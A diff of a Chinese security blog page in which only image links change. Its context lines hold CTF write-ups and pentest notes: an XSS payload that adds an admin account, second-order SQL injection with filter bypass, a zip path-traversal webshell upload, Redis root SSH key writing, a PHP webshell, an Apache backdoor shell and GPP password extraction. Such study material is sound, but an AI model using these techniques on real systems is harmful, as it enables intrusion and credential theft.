-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2093290607.png&quot; alt=&quot;2093290607&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-2093290607.png&quot; alt=&quot;2093290607&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;注意的是我用的docker环境，所以是直接ssh的docker的ip&lt;/p&gt;
 
@@ -880,8 +880,7 @@ listen 4444 10.211.55.19:22 #将内网10.211.55.19的22端口转发到本地的4
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;link rel=&quot;import&quot; href=&quot;data:text/html;base64,PHNjcmlwdD5kZWxldGUgYWxlcnQ7YWxlcnQoIkhlbGxvIik7PC9zY3JpcHQ+&quot;&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-1170534972.jpg&quot; alt=&quot;xss-1.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-1170534972.jpg&quot; alt=&quot;xss-1.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;查看页面的html源码发现&lt;/p&gt;
 
@@ -913,21 +912,21 @@ password:&amp;lt;input type=&quot;password&quot; name=&quot;pass&quot;&amp;gt;&a
 &lt;p&gt;添加了一个帐号密码为tomato123的管理员
 访问admin.php拿到flag&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-545225687.jpg&quot; alt=&quot;xss－2.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-545225687.jpg&quot; alt=&quot;xss－2.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;easysql&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;注册一个aaa\然后在修改密码的页面可以发现报错&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2913177276.jpg&quot; alt=&quot;easysql-1.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-2913177276.jpg&quot; alt=&quot;easysql-1.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;可以看到是双引号，这明显是一个二次注入，然后重新构造语句发现不能含有空格。但是这并不影响，直接用括号代替就行了。&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-157009057.jpg&quot; alt=&quot;easysql-2.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-157009057.jpg&quot; alt=&quot;easysql-2.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;然后爆出一个flag表，查询提示说flag not here，然后去查users里面的列名发现&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3268258668.jpg&quot; alt=&quot;easysql－3.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-3268258668.jpg&quot; alt=&quot;easysql－3.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;然后直接去查询里面的内容，发现只能出现RCTF这几个字符，然后就一直在纠结怎么查询，因为测试发现把substring left，right，reverse like 这些都拦截了。后面灵机一动想到了regexp。&lt;/p&gt;
 
@@ -935,16 +934,15 @@ password:&amp;lt;input type=&quot;password&quot; name=&quot;pass&quot;&amp;gt;&a
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;然后成功搞定&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-1387239513.jpg&quot; alt=&quot;easysql－4.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-1387239513.jpg&quot; alt=&quot;easysql－4.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;login&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;第二天给了提示说是nosql，那就猜是mongodb&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3330162428.jpg&quot; alt=&quot;login-1.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;第二天给了提示说是nosql，那就猜是mongodb
+&lt;img src=&quot;/old_img/2017-04-17-3330162428.jpg&quot; alt=&quot;login-1.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;那就开始跑密码了。
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3255963769.jpg&quot; alt=&quot;login－2.jpg&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/old_img/2017-04-17-3255963769.jpg&quot; alt=&quot;login－2.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;跑出的帐号密码为&lt;/p&gt;
 
@@ -952,11 +950,11 @@ password:&amp;lt;input type=&quot;password&quot; name=&quot;pass&quot;&amp;gt;&a
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;然后登陆一发。&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-460039838.jpg&quot; alt=&quot;login-3.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-460039838.jpg&quot; alt=&quot;login-3.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;下载备份文件，发现是一个php的解压zip的类，然后百度找到官方提供的，在diff一下&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-1149569489.jpg&quot; alt=&quot;login-4.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-1149569489.jpg&quot; alt=&quot;login-4.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;还在html源码里面发现&lt;/p&gt;
 
@@ -980,7 +978,7 @@ password:&amp;lt;input type=&quot;password&quot; name=&quot;pass&quot;&amp;gt;&a
 &lt;p&gt;测试发现直接上传zip提示没有权限，然后只有过了上面三个条件才行。主要是第三个条件不好过，然后google一发
 pdkdf2 ctf&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2664205826.jpg&quot; alt=&quot;2664205826&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-2664205826.jpg&quot; alt=&quot;2664205826&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;找到了这个 PBKDF2+HMAC collision
 然后在https://mathiasbynens.be/notes/pbkdf2-hmac
@@ -992,15 +990,15 @@ pdkdf2 ctf&lt;/p&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;然后改一下ua，在cookie里面添加backdoor就可以成功上传了。&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2009859300.jpg&quot; alt=&quot;2009859300&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-2009859300.jpg&quot; alt=&quot;2009859300&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;按照解压出来的文件的命名规则为md5(文件名＋RoisFighting).文件的后缀
 但是访问http://180.76.178.54:8005/53a0fb1b692f02436c3b5dda1db9c361/upload/image/051ee28a1964f9f2779d32f2e48212cb/70d08f9380da3a6e0440b3266a2a39f6.php
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2977300730.jpg&quot; alt=&quot;2977300730&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/old_img/2017-04-17-2977300730.jpg&quot; alt=&quot;2977300730&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;文件并不存在，测试发现在解压后会直接删除文件，所以我们可以尝试构造一个解压到上级目录的shell&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2977300730.jpg&quot; alt=&quot;login-7.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-2977300730.jpg&quot; alt=&quot;login-7.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;shell地址就是
 http://180.76.178.54:8005/53a0fb1b692f02436c3b5dda1db9c361/upload/image/382aef24b11f8c5222bc58062a9bf5c7.php&lt;/p&gt;
@@ -1035,9 +1033,9 @@ http://180.76.178.54:8005/53a0fb1b692f02436c3b5dda1db9c361/upload/image/382aef24
 
 &lt;p&gt;默认安装redis，其中启动权限就为root。并且是任意ip可以未授权访问。&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2276273468.jpg&quot; alt=&quot;2276273468&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-2276273468.jpg&quot; alt=&quot;2276273468&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-91190645.jpg&quot; alt=&quot;91190645&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-91190645.jpg&quot; alt=&quot;91190645&quot; /&gt;&lt;/p&gt;
 
 &lt;hr /&gt;
 
@@ -1098,8 +1096,7 @@ exit
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -i redis.pub root@192.168.192.133
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2436203329.png&quot; alt=&quot;2436203329&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-2436203329.png&quot; alt=&quot;2436203329&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;缺点：flushall 太暴力直接清空数据库，覆盖authorized_keys，导致原有的认证失效。&lt;/p&gt;
 
@@ -1384,7 +1381,7 @@ foreach(array('_GET','_POST') as $_request)
 
 &lt;p&gt;然后可以看到数据库里&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-308065326.png&quot; alt=&quot;308065326&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-308065326.png&quot; alt=&quot;308065326&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;这里已经被成功update进去一个一句话木马了。&lt;/p&gt;
 
@@ -1392,7 +1389,7 @@ foreach(array('_GET','_POST') as $_request)
 访问
 http://127.0.0.1/PHPMyWind_5.3/goodsshow.php?cid=12&amp;amp;tid=10&amp;amp;id=1&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2215906991.png&quot; alt=&quot;2215906991&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-2215906991.png&quot; alt=&quot;2215906991&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;成功执行代码&lt;/p&gt;
 
@@ -1439,7 +1436,7 @@ Apache2.5
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;然后保存。输入make linux进行编译&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-185317750.jpg&quot; alt=&quot;185317750&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-185317750.jpg&quot; alt=&quot;185317750&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;然后修改/etc/httpd/conf/httpd.conf&lt;/p&gt;
 
@@ -1449,7 +1446,7 @@ Apache2.5
 
 &lt;p&gt;然后使用就可以连接80端口 nc ip 80 然后输入GET root&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-4195482967.jpg&quot; alt=&quot;4195482967&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-4195482967.jpg&quot; alt=&quot;4195482967&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;成功获取shell&lt;/p&gt;
 
@@ -1464,7 +1461,7 @@ Apache2.5
   &lt;/tbody&gt;
 &lt;/table&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-67507677.jpg&quot; alt=&quot;67507677&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-67507677.jpg&quot; alt=&quot;67507677&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;然后可以进一步去查看apache配置文件&lt;/p&gt;
 
@@ -1500,23 +1497,23 @@ windows2008 域控
 &lt;p&gt;首先部署GPP，这里我部署的策略是给域成员都添加一个test用户，密码为test123
 ![QQ截图20150815011901.png][1]&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-493775859.png&quot; alt=&quot;493775859&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-493775859.png&quot; alt=&quot;493775859&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;添加一个本地用户
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3035697488.png&quot; alt=&quot;3035697488&quot; /&gt;
+&lt;img src=&quot;/old_img/2017-04-17-3035697488.png&quot; alt=&quot;3035697488&quot; /&gt;
 然后来到组策略管理&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-1117809806.png&quot; alt=&quot;1117809806&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-1117809806.png&quot; alt=&quot;1117809806&quot; /&gt;
 将domain computers 添加到验证组策略对象&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2121700627.png&quot; alt=&quot;2121700627&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-2121700627.png&quot; alt=&quot;2121700627&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;然后到域成员win7这台机器上执行&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gpupdate &amp;amp;&amp;amp; net user
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-1994353166.png&quot; alt=&quot;1994353166&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-1994353166.png&quot; alt=&quot;1994353166&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;然后可以访问&lt;/p&gt;
 
@@ -1543,7 +1540,7 @@ DataSources\DataSources.xml
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;拿到加密密码之后，我们使用脚本解密&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2062133923.png&quot; alt=&quot;2062133923&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-2062133923.png&quot; alt=&quot;2062133923&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;或者使用powershell脚本&lt;/p&gt;
 
